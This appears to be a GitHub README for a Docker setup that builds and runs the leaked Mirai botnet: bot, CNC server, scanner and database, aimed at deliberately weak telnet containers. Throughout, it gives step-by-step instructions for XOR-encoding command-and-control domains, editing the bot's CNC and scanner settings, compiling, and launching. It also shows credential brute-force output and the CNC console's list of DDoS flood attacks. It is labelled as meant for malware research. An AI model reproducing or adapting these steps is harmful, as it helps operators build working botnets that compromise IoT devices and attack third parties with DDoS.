# Mirai-Docker

This is a docker compose file that makes it easy to build the [Mirai Botnet](https://en.wikipedia.org/wiki/Mirai_(malware)) development environment, CNC server and database.

Mirai Botnet is a malware that performs DDoS attacks by infecting insecure Internet of Things(IoT) devices.
It was used in a DDoS attack in 2016, and the source code was leaked.
It is now open to [Mirai-Source-Code](https://github.com/jgamblin/Mirai-Source-Code) for malicious code analysis and research purposes. 

미라이 봇넷의 개발 환경과 CNC 서버 및 데이터베이스를 쉽게 구축할 수 있도록 만든 도커 컴포즈 파일입니다.

미라이 봇넷은 보안이 취약한 사물 인터넷(IoT) 기기를 감염시켜 DDoS 공격을 수행하는 악성코드입니다.
2016년 DDoS 공격에 사용되었으며, 소스코드가 유출되어 현재는 악성코드 분석 및 연구 목적으로 [Mirai-Source-Code](https://github.com/jgamblin/Mirai-Source-Code)에 공개되어 있습니다.

**WARNING: FOR RESEARCH PURPOSES ONLY. 연구 목적으로만 사용하세요.**


## 01. Install docker and docker compose
- https://docs.docker.com/get-docker/
- https://github.com/docker/compose

For Ubuntu:
```
sudo apt update
sudo apt install -y ca-certificates curl software-properties-common apt-transport-https gnupg lsb-release

curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"

sudo apt install -y docker-ce docker-ce-cli containerd.io
sudo systemctl start docker
sudo systemctl enable docker
sudo usermod -aG docker $USER

docker -v
```
```
mkdir -p ~/.docker/cli-plugins/
curl -SL "https://github.com/docker/compose/releases/download/v2.2.3/docker-compose-linux-$(uname -m)" -o ~/.docker/cli-plugins/docker-compose
chmod +x ~/.docker/cli-plugins/docker-compose

docker compose version
```
A reboot or re-login may be required.

## 02. Clone this repository
```
$ git clone https://github.com/deunlee/Mirai-Docker
$ cd Mirai-Docker
```


## 03. Build docker containers
```
$ docker compose build
```


## 04. Encrypt your domain
```
$ docker compose run compile ./enc.sh string cnc.changeme.com
XOR'ing 17 bytes of data...
\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22
```
```
$ docker compose run compile ./enc.sh string report.changeme.com
XOR'ing 20 bytes of data...
\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22
```

If you don't have a domain, build a DNS server locally, or use a service like [`nip.io`](https://nip.io/).
`nip.io` is a simple DNS service that returns an IP written on a domain address.
For example, `some-string-11-22-33-44.nip.io` resolves to `11.22.33.44`.
```
$ docker compose run compile ./enc.sh string cnc-172-20-0-3.nip.io
XOR'ing 22 bytes of data...
\x41\x4C\x41\x0F\x13\x15\x10\x0F\x10\x12\x0F\x12\x0F\x11\x0C\x4C\x4B\x52\x0C\x4B\x4D\x22
```
```
$ docker compose run compile ./enc.sh string report-172-20-0-4.nip.io
XOR'ing 25 bytes of data...
\x50\x47\x52\x4D\x50\x56\x0F\x13\x15\x10\x0F\x10\x12\x0F\x12\x0F\x16\x0C\x4C\x4B\x52\x0C\x4B\x4D\x22
```


## 05. Configure bot
Edit some domains in [./src/mirai/bot/table.c](./src/mirai/bot/table.c)
```c
add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com
add_entry(TABLE_CNC_PORT, "\x22\x35", 2); // 23

add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 29); // report.changeme.com
add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2); // 48101
```

Edit DNS server in [./src/mirai/bot/resolv.c](./src/mirai/bot/resolv.c)
```c
struct resolv_entries *resolv_lookup(char *domain)
{
    // ...

    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8); // <-- here!
    addr.sin_port = htons(53);

    // ...
}
```

If you want to enable scanner in debug mode, comment out the following two lines in [./src/mirai/bot/main.c](./src/mirai/bot/main.c)
```c
// #ifndef DEBUG // <-- comment here!
#ifdef MIRAI_TELNET
    scanner_init();
#endif
// #endif // <-- comment here!
```

Edit get_random_ip() function in [./src/mirai/bot/scanner.c](./src/mirai/bot/scanner.c)
```c
static ipv4_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    // comment do-while loop

    return INET_ADDR(172, 20, 0, rand_next() & 0xff); // fixed ip range
}
```

## 06. Configure CNC
Edit database config in [./src/mirai/cnc/main.go](./src/mirai/cnc/main.go)
```go
const DatabaseAddr string   = "mariadb" // "127.0.0.1"
const DatabaseUser string   = "user"
const DatabasePass string   = "this-is-password!"
const DatabaseTable string  = "mirai"
```

Edit prompt path in [./src/mirai/cnc/admin.go](./src/mirai/cnc/admin.go)
```go
headerb, err := ioutil.ReadFile("/home/user/src/mirai/prompt.txt") // <-- here!
```

Edit CNC user in [./src/scripts/db.sql](./src/scripts/db.sql)
```sql
-- CREATE DATABASE mirai; --- comment here!

CREATE TABLE `history` (

--- ...

  KEY `prefix` (`prefix`)
);

INSERT INTO users VALUES (NULL, 'mirai-user', 'mirai-pass', 0, 0, 0, 0, -1, 1, 30, ''); --- here!
```


## 07. Compile everything
```
$ docker compose run compile ./build.sh
```

Debug bot only:
```
$ docker compose run compile ./debug.sh
```


## 08. Run CNC, loader, scanListen and mariadb
```
$ docker compose up
```
```
mirai-docker-compile-1 exited with code 0
mirai-docker-victim-1   | victim :: A telnetd is running at 172.20.0.11:23
mirai-docker-victim-1   | victim :: User: root, Password: 1234
mirai-docker-victim2-1  | victim2 :: A telnetd is running at 172.20.0.12:23
mirai-docker-victim2-1  | victim2 :: User: root, Password: password
mirai-docker-victim3-1  | victim3 :: A telnetd is running at 172.20.0.13:23
mirai-docker-victim3-1  | victim3 :: User: root, Password: system
mirai-docker-bot-1 exited with code 0
mirai-docker-mariadb-1  | .....
mirai-docker-cnc-1      | Mysql DB opened
mirai-docker-scan-1     | Start scanListen
mirai-docker-scan-1     | 172.20.0.12:23 root:password
mirai-docker-scan-1     | 172.20.0.13:23 root:system
mirai-docker-scan-1     | 172.20.0.11:23 root:1234
```

## 09. Connect to CNC server
```
$ docker compose exec cnc telnet 127.0.0.1
```
or
```
$ telnet 127.0.0.1
```
```
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
я люблю куриные наггетсы
пользователь: mirai-user
пароль: **********

проверив счета... |
[+] DDOS | Succesfully hijacked connection
[+] DDOS | Masking connection from utmp+wtmp...
[+] DDOS | Hiding from netstat...
[+] DDOS | Removing all traces of LD_PRELOAD...
[+] DDOS | Wiping env libc.poison.so.1
[+] DDOS | Wiping env libc.poison.so.2
[+] DDOS | Wiping env libc.poison.so.3
[+] DDOS | Wiping env libc.poison.so.4
[+] DDOS | Setting up virtual terminal...
[!] Sharing access IS prohibited!
[!] Do NOT share your credentials!
Ready
mirai-user@botnet# ?
Available attack list
dns: DNS resolver flood using the targets domain, input IP is ignored
stomp: TCP stomp flood
udpplain: UDP flood with less options. optimized for higher PPS
udp: UDP flood
vse: Valve source engine specific flood
syn: SYN flood
ack: ACK flood
greip: GRE IP flood
greeth: GRE Ethernet flood
http: HTTP flood

mirai-user@botnet#
```

<!--
```
$ docker compose run compile
mysql -h mariadb -P 3306 -u"user" -p"this-is-password!"
use mirai;
select * from users;
```
```
$ docker compose up mariadb -d
$ docker compose run compile sudo ./src/mirai/debug/cnc
```
-->


## 10. Run victim (insecure telnet server)
```
$ docker compose run victim
```


## 10. Run first bot
It will scan and report victims.
```
$ docker compose run bot /home/user/src/mirai/debug/mirai.dbg
```
